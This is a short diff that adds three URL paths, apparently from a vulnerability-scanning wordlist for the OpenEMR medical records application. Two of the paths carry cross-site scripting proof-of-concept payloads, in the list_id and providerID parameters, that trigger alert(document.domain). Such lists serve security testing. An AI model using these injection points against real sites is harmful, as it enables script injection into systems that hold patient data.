@@ -1,0 +1,3 @@
+/interface/login/login.php?site=default
+/library/custom_template/share_template.php?list_id=1}});}}alert(document.domain);function%20x(){if(1){a=({a:{a:1
+/interface/forms/eye_mag/js/eye_base.php?providerID=%3Cimg%20src=x%20onerror=alert(document.domain);%3E
